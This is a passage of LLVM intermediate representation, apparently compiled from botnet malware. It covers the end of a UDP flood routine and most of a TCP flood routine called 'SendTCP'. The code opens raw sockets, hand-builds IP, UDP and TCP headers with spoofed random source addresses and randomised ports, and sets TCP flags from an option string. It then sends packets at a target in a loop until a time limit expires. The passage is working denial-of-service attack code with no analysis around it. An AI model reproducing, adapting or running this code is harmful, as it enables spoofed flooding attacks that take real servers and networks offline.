  store i32 %5, i32* %12, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %8, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

28:                                               ; preds = %6
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  br label %37

32:                                               ; preds = %6
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 noundef zeroext %34) #12
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  br label %37

37:                                               ; preds = %32, %28
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* noundef %38, %struct.in_addr* noundef %39)
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  br label %207

43:                                               ; preds = %37
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %44, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %45, i8 0, i64 8, i1 false)
  %46 = load i32, i32* %11, align 4
  store i32 %46, i32* %14, align 4
  %47 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #10
  store i32 %47, i32* %15, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

50:                                               ; preds = %43
  br label %207

51:                                               ; preds = %43
  store i32 1, i32* %16, align 4
  %52 = load i32, i32* %15, align 4
  %53 = bitcast i32* %16 to i8*
  %54 = call i32 @setsockopt(i32 noundef %52, i32 noundef 0, i32 noundef 3, i8* noundef %53, i32 noundef 4) #10
  %55 = icmp slt i32 %54, 0
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  br label %207

57:                                               ; preds = %51
  store i32 50, i32* %17, align 4
  br label %58

58:                                               ; preds = %62, %57
  %59 = load i32, i32* %17, align 4
  %60 = add nsw i32 %59, -1
  store i32 %60, i32* %17, align 4
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %62, label %69

62:                                               ; preds = %58
  %63 = call i64 @time(i64* noundef null) #10
  %64 = call i32 @rand_cmwc()
  %65 = zext i32 %64 to i64
  %66 = xor i64 %63, %65
  %67 = trunc i64 %66 to i32
  call void @srand(i32 noundef %67) #10
  %68 = call i32 @rand() #10
  call void @init_rand(i32 noundef %68)
  br label %58, !llvm.loop !41

69:                                               ; preds = %58
  %70 = load i32, i32* %12, align 4
  %71 = sub nsw i32 32, %70
  %72 = shl i32 1, %71
  %73 = sub nsw i32 %72, 1
  %74 = xor i32 %73, -1
  store i32 %74, i32* %18, align 4
  %75 = load i32, i32* %10, align 4
  %76 = sext i32 %75 to i64
  %77 = add i64 28, %76
  %78 = call i8* @llvm.stacksave()
  store i8* %78, i8** %19, align 8
  %79 = alloca i8, i64 %77, align 16
  store i64 %77, i64* %20, align 8
  %80 = bitcast i8* %79 to %struct.iphdr*
  store %struct.iphdr* %80, %struct.iphdr** %21, align 8
  %81 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %82 = bitcast %struct.iphdr* %81 to i8*
  %83 = getelementptr i8, i8* %82, i64 20
  %84 = bitcast i8* %83 to %struct.udphdr*
  store %struct.udphdr* %84, %struct.udphdr** %22, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  %89 = load i32, i32* %18, align 4
  %90 = call i32 @getRandomIP(i32 noundef %89)
  %91 = call i32 @htonl(i32 noundef %90) #12
  %92 = load i32, i32* %10, align 4
  %93 = sext i32 %92 to i64
  %94 = add i64 8, %93
  %95 = trunc i64 %94 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %85, i32 noundef %88, i32 noundef %91, i8 noundef zeroext 17, i32 noundef %95)
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 8, %97
  %99 = trunc i64 %98 to i16
  %100 = call zeroext i16 @htons(i16 noundef zeroext %99) #12
  %101 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %102 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.1* %102 to %struct.anon.2*
  %104 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %103, i32 0, i32 2
  store i16 %100, i16* %104, align 2
  %105 = call i32 @rand_cmwc()
  %106 = trunc i32 %105 to i16
  %107 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %108 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %107, i32 0, i32 0
  %109 = bitcast %union.anon.1* %108 to %struct.anon.2*
  %110 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %109, i32 0, i32 0
  store i16 %106, i16* %110, align 2
  %111 = load i32, i32* %8, align 4
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %115

113:                                              ; preds = %69
  %114 = call i32 @rand_cmwc()
  br label %120

115:                                              ; preds = %69
  %116 = load i32, i32* %8, align 4
  %117 = trunc i32 %116 to i16
  %118 = call zeroext i16 @htons(i16 noundef zeroext %117) #12
  %119 = zext i16 %118 to i32
  br label %120

120:                                              ; preds = %115, %113
  %121 = phi i32 [ %114, %113 ], [ %119, %115 ]
  %122 = trunc i32 %121 to i16
  %123 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %124 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.1* %124 to %struct.anon.2*
  %126 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %125, i32 0, i32 1
  store i16 %122, i16* %126, align 2
  %127 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 3
  store i16 0, i16* %130, align 2
  %131 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %132 = bitcast %struct.udphdr* %131 to i8*
  %133 = getelementptr inbounds i8, i8* %132, i64 8
  %134 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* noundef %133, i32 noundef %134)
  %135 = bitcast i8* %79 to i16*
  %136 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 2
  %138 = load i16, i16* %137, align 2
  %139 = zext i16 %138 to i32
  %140 = call zeroext i16 @csum(i16* noundef %135, i32 noundef %139)
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 7
  store i16 %140, i16* %142, align 2
  %143 = call i64 @time(i64* noundef null) #10
  %144 = load i32, i32* %9, align 4
  %145 = sext i32 %144 to i64
  %146 = add nsw i64 %143, %145
  %147 = trunc i64 %146 to i32
  store i32 %147, i32* %23, align 4
  store i32 0, i32* %24, align 4
  br label %148

148:                                              ; preds = %202, %201, %120
  br label %149

149:                                              ; preds = %148
  %150 = load i32, i32* %15, align 4
  %151 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %152 = call i64 @sendto(i32 noundef %150, i8* noundef %79, i64 noundef %77, i32 noundef 0, %struct.sockaddr* noundef %151, i32 noundef 16)
  %153 = call i32 @rand_cmwc()
  %154 = trunc i32 %153 to i16
  %155 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 0
  store i16 %154, i16* %158, align 2
  %159 = load i32, i32* %8, align 4
  %160 = icmp eq i32 %159, 0
  br i1 %160, label %161, label %163

161:                                              ; preds = %149
  %162 = call i32 @rand_cmwc()
  br label %168

163:                                              ; preds = %149
  %164 = load i32, i32* %8, align 4
  %165 = trunc i32 %164 to i16
  %166 = call zeroext i16 @htons(i16 noundef zeroext %165) #12
  %167 = zext i16 %166 to i32
  br label %168

168:                                              ; preds = %163, %161
  %169 = phi i32 [ %162, %161 ], [ %167, %163 ]
  %170 = trunc i32 %169 to i16
  %171 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon.1* %172 to %struct.anon.2*
  %174 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %173, i32 0, i32 1
  store i16 %170, i16* %174, align 2
  %175 = call i32 @rand_cmwc()
  %176 = trunc i32 %175 to i16
  %177 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i32, i32* %18, align 4
  %180 = call i32 @getRandomIP(i32 noundef %179)
  %181 = call i32 @htonl(i32 noundef %180) #12
  %182 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = bitcast i8* %79 to i16*
  %185 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  %187 = load i16, i16* %186, align 2
  %188 = zext i16 %187 to i32
  %189 = call zeroext i16 @csum(i16* noundef %184, i32 noundef %188)
  %190 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 7
  store i16 %189, i16* %191, align 2
  %192 = load i32, i32* %24, align 4
  %193 = load i32, i32* %14, align 4
  %194 = icmp eq i32 %192, %193
  br i1 %194, label %195, label %202

195:                                              ; preds = %168
  %196 = call i64 @time(i64* noundef null) #10
  %197 = load i32, i32* %23, align 4
  %198 = sext i32 %197 to i64
  %199 = icmp sgt i64 %196, %198
  br i1 %199, label %200, label %201

200:                                              ; preds = %195
  br label %205

201:                                              ; preds = %195
  store i32 0, i32* %24, align 4
  br label %148

202:                                              ; preds = %168
  %203 = load i32, i32* %24, align 4
  %204 = add i32 %203, 1
  store i32 %204, i32* %24, align 4
  br label %148

205:                                              ; preds = %200
  %206 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %206)
  br label %207

207:                                              ; preds = %205, %56, %50, %42
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @srand(i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #6

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr* noundef, i32 noundef) #1

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @SendTCP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i8* noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %13, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 noundef zeroext %37) #12
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* noundef %41, %struct.in_addr* noundef %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %336

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #10
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %53, label %52

52:                                               ; preds = %46
  br label %336

53:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %54 = load i32, i32* %17, align 4
  %55 = bitcast i32* %18 to i8*
  %56 = call i32 @setsockopt(i32 noundef %54, i32 noundef 0, i32 noundef 3, i8* noundef %55, i32 noundef 4) #10
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %59

58:                                               ; preds = %53
  br label %336

59:                                               ; preds = %53
  %60 = load i32, i32* %14, align 4
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %59
  store i32 0, i32* %19, align 4
  br label %69

63:                                               ; preds = %59
  %64 = load i32, i32* %14, align 4
  %65 = sub nsw i32 32, %64
  %66 = shl i32 1, %65
  %67 = sub nsw i32 %66, 1
  %68 = xor i32 %67, -1
  store i32 %68, i32* %19, align 4
  br label %69

69:                                               ; preds = %63, %62
  %70 = load i32, i32* %12, align 4
  %71 = sext i32 %70 to i64
  %72 = add i64 40, %71
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %20, align 8
  %74 = alloca i8, i64 %72, align 16
  store i64 %72, i64* %21, align 8
  %75 = bitcast i8* %74 to %struct.iphdr*
  store %struct.iphdr* %75, %struct.iphdr** %22, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %77 = bitcast %struct.iphdr* %76 to i8*
  %78 = getelementptr i8, i8* %77, i64 20
  %79 = bitcast i8* %78 to %struct.tcphdr*
  store %struct.tcphdr* %79, %struct.tcphdr** %23, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = load i32, i32* %19, align 4
  %85 = call i32 @getRandomIP(i32 noundef %84)
  %86 = call i32 @htonl(i32 noundef %85) #12
  %87 = load i32, i32* %12, align 4
  %88 = sext i32 %87 to i64
  %89 = add i64 20, %88
  %90 = trunc i64 %89 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %80, i32 noundef %83, i32 noundef %86, i8 noundef zeroext 6, i32 noundef %90)
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 0
  %95 = bitcast %union.anon* %94 to %struct.anon.0*
  %96 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %95, i32 0, i32 0
  store i16 %92, i16* %96, align 4
  %97 = call i32 @rand_cmwc()
  %98 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon* %99 to %struct.anon.0*
  %101 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %100, i32 0, i32 2
  store i32 %97, i32* %101, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 3
  store i32 0, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 4
  %110 = load i16, i16* %109, align 4
  %111 = and i16 %110, -241
  %112 = or i16 %111, 80
  store i16 %112, i16* %109, align 4
  %113 = load i8*, i8** %11, align 8
  %114 = call i32 @strcmp(i8* noundef %113, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.501, i64 0, i64 0)) #11
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %152, label %116

116:                                              ; preds = %69
  %117 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon* %118 to %struct.anon.0*
  %120 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %119, i32 0, i32 4
  %121 = load i16, i16* %120, align 4
  %122 = and i16 %121, -513
  %123 = or i16 %122, 512
  store i16 %123, i16* %120, align 4
  %124 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon* %125 to %struct.anon.0*
  %127 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %126, i32 0, i32 4
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -1025
  %130 = or i16 %129, 1024
  store i16 %130, i16* %127, align 4
  %131 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon* %132 to %struct.anon.0*
  %134 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %133, i32 0, i32 4
  %135 = load i16, i16* %134, align 4
  %136 = and i16 %135, -257
  %137 = or i16 %136, 256
  store i16 %137, i16* %134, align 4
  %138 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon* %139 to %struct.anon.0*
  %141 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -4097
  %144 = or i16 %143, 4096
  store i16 %144, i16* %141, align 4
  %145 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 4
  %149 = load i16, i16* %148, align 4
  %150 = and i16 %149, -2049
  %151 = or i16 %150, 2048
  store i16 %151, i16* %148, align 4
  br label %226

152:                                              ; preds = %69
  %153 = load i8*, i8** %11, align 8
  %154 = call i8* @strtok(i8* noundef %153, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.502, i64 0, i64 0)) #10
  store i8* %154, i8** %24, align 8
  br label %155

155:                                              ; preds = %223, %152
  %156 = load i8*, i8** %24, align 8
  %157 = icmp ne i8* %156, null
  br i1 %157, label %158, label %225

158:                                              ; preds = %155
  %159 = load i8*, i8** %24, align 8
  %160 = call i32 @strcmp(i8* noundef %159, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.503, i64 0, i64 0)) #11
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %170, label %162

162:                                              ; preds = %158
  %163 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = and i16 %167, -513
  %169 = or i16 %168, 512
  store i16 %169, i16* %166, align 4
  br label %223

170:                                              ; preds = %158
  %171 = load i8*, i8** %24, align 8
  %172 = call i32 @strcmp(i8* noundef %171, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.504, i64 0, i64 0)) #11
  %173 = icmp ne i32 %172, 0
  br i1 %173, label %182, label %174

174:                                              ; preds = %170
  %175 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon* %176 to %struct.anon.0*
  %178 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -1025
  %181 = or i16 %180, 1024
  store i16 %181, i16* %178, align 4
  br label %222

182:                                              ; preds = %170
  %183 = load i8*, i8** %24, align 8
  %184 = call i32 @strcmp(i8* noundef %183, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.505, i64 0, i64 0)) #11
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %194, label %186

186:                                              ; preds = %182
  %187 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon* %188 to %struct.anon.0*
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -257
  %193 = or i16 %192, 256
  store i16 %193, i16* %190, align 4
  br label %221

194:                                              ; preds = %182
  %195 = load i8*, i8** %24, align 8
  %196 = call i32 @strcmp(i8* noundef %195, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.506, i64 0, i64 0)) #11
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %206, label %198

198:                                              ; preds = %194
  %199 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon* %200 to %struct.anon.0*
  %202 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = and i16 %203, -4097
  %205 = or i16 %204, 4096
  store i16 %205, i16* %202, align 4
  br label %220

206:                                              ; preds = %194
  %207 = load i8*, i8** %24, align 8
  %208 = call i32 @strcmp(i8* noundef %207, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.507, i64 0, i64 0)) #11
  %209 = icmp ne i32 %208, 0
  br i1 %209, label %218, label %210

210:                                              ; preds = %206
  %211 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon* %212 to %struct.anon.0*
  %214 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %215, -2049
  %217 = or i16 %216, 2048
  store i16 %217, i16* %214, align 4
  br label %219

218:                                              ; preds = %206
  br label %219

219:                                              ; preds = %218, %210
  br label %220

220:                                              ; preds = %219, %198
  br label %221

221:                                              ; preds = %220, %186
  br label %222

222:                                              ; preds = %221, %174
  br label %223

223:                                              ; preds = %222, %162
  %224 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %224, i8** %24, align 8
  br label %155, !llvm.loop !42

225:                                              ; preds = %155
  br label %226

226:                                              ; preds = %225, %116
  %227 = call i32 @rand_cmwc()
  %228 = trunc i32 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon* %230 to %struct.anon.0*
  %232 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %231, i32 0, i32 5
  store i16 %228, i16* %232, align 2
  %233 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon* %234 to %struct.anon.0*
  %236 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %235, i32 0, i32 6
  store i16 0, i16* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon* %238 to %struct.anon.0*
  %240 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %239, i32 0, i32 7
  store i16 0, i16* %240, align 2
  %241 = load i32, i32* %9, align 4
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %245

243:                                              ; preds = %226
  %244 = call i32 @rand_cmwc()
  br label %250

245:                                              ; preds = %226
  %246 = load i32, i32* %9, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 noundef zeroext %247) #12
  %249 = zext i16 %248 to i32
  br label %250

250:                                              ; preds = %245, %243
  %251 = phi i32 [ %244, %243 ], [ %249, %245 ]
  %252 = trunc i32 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon* %254 to %struct.anon.0*
  %256 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %259 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %257, %struct.tcphdr* noundef %258)
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 6
  store i16 %259, i16* %263, align 4
  %264 = bitcast i8* %74 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* noundef %264, i32 noundef %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = call i64 @time(i64* noundef null) #10
  %273 = load i32, i32* %10, align 4
  %274 = sext i32 %273 to i64
  %275 = add nsw i64 %272, %274
  %276 = trunc i64 %275 to i32
  store i32 %276, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %277

277:                                              ; preds = %331, %330, %250
  br label %278

278:                                              ; preds = %277
  %279 = load i32, i32* %17, align 4
  %280 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 noundef %279, i8* noundef %74, i64 noundef %72, i32 noundef 0, %struct.sockaddr* noundef %280, i32 noundef 16)
  %282 = load i32, i32* %19, align 4
  %283 = call i32 @getRandomIP(i32 noundef %282)
  %284 = call i32 @htonl(i32 noundef %283) #12
  %285 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  store i32 %284, i32* %286, align 4
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
